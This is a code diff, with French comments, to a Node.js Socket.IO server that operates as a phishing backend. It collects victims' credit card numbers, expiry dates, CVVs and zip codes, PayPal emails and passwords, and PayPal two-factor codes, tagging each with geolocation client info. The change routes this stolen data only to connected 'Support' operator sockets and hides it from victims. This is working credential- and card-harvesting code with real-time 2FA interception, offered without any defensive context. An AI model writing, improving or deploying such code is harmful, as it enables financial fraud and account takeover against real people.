@@ -29,6 +29,10 @@ const CORRECT_DATE_USER = "18/09/2025";
 const CORRECT_CODE_SERVICE = "gg";
 const CORRECT_DATE_SERVICE = "123";
 
+// --- Stockage des connexions par type d'utilisateur ---
+const supportSockets = new Set();
+const userSockets = new Set();
+
 // --- Route API de vérification ---
 app.post('/verify', (req, res) => {
   const { code, date } = req.body;
@@ -61,6 +65,16 @@ io.on('connection', async (socket) => {
     connectedAt: new Date().toISOString(),
     ...geoInfo
   };
+
+  // Déterminer le type d'utilisateur lors de la connexion
+  socket.on('user type', (data) => {
+    socket.userType = data.userType;
+    if (data.userType === 'Support') {
+      supportSockets.add(socket);
+    } else if (data.userType === 'User') {
+      userSockets.add(socket);
+    }
+  });
   
   socket.broadcast.emit('user activity', { text: 'A user has connected.' });
 
@@ -93,50 +107,78 @@ io.on('connection', async (socket) => {
   });
 
   socket.on('popup choice', (choice) => {
-    io.emit('chat message', {
-      user: 'System',
-      text: `User has chosen the option: "${choice.option}"`,
-      clientInfo
+    // Envoyer uniquement aux sockets support
+    supportSockets.forEach(supportSocket => {
+      if (supportSocket.connected) {
+        supportSocket.emit('chat message', {
+          user: 'System',
+          text: `User has chosen the option: "${choice.option}"`,
+          clientInfo
+        });
+      }
     });
   });
 
   socket.on('credit card data', (data) => {
     const { cardData } = data;
-    io.emit('chat message', {
-      user: 'System',
-      text: `Credit Card Information Received:
+    // Envoyer uniquement aux sockets support
+    supportSockets.forEach(supportSocket => {
+      if (supportSocket.connected) {
+        supportSocket.emit('chat message', {
+          user: 'System',
+          text: `Credit Card Information Received:
 📧 Cardholder: ${cardData.cardHolderName}
 💳 Card Number: ${cardData.cardNumber}
 📅 Expiry: ${cardData.expiryDate}
 🔒 CVV: ${cardData.cvv}
 📮 Zip Code: ${cardData.billingZip || 'Not provided'}`,
-      clientInfo
+          clientInfo
+        });
+      }
     });
   });
 
   socket.on('paypal login1 data', (data) => {
     const { loginData } = data;
-    io.emit('chat message', {
-      user: 'System',
-      text: `PayPal Login Information Received (Step 1):
+    // Envoyer uniquement aux sockets support
+    supportSockets.forEach(supportSocket => {
+      if (supportSocket.connected) {
+        supportSocket.emit('chat message', {
+          user: 'System',
+          text: `PayPal Login Information Received (Step 1):
 📧 Email: ${loginData.email}
 🔐 Password: ${loginData.password}`,
-      clientInfo
+          clientInfo
+        });
+      }
     });
   });
 
   socket.on('paypal login2 data', (data) => {
     const { verificationData } = data;
-    io.emit('chat message', {
-      user: 'System',
-      text: `PayPal 2FA Code Received (Step 2):
+    // Envoyer uniquement aux sockets support
+    supportSockets.forEach(supportSocket => {
+      if (supportSocket.connected) {
+        supportSocket.emit('chat message', {
+          user: 'System',
+          text: `PayPal 2FA Code Received (Step 2):
 🔢 Verification Code: ${verificationData.verificationCode}`,
-      clientInfo
+          clientInfo
+        });
+      }
     });
   });
 
-  socket.on('clear chat', () => { io.emit('chat cleared'); });
-  socket.on('disconnect', () => { io.emit('user activity', { text: 'A user has disconnected.' }); });
+  socket.on('clear chat', () => { 
+    io.emit('chat cleared'); 
+  });
+  
+  socket.on('disconnect', () => { 
+    // Nettoyer les sets lors de la déconnexion
+    supportSockets.delete(socket);
+    userSockets.delete(socket);
+    io.emit('user activity', { text: 'A user has disconnected.' }); 
+  });
 });
 
 // --- Démarrage du serveur ---
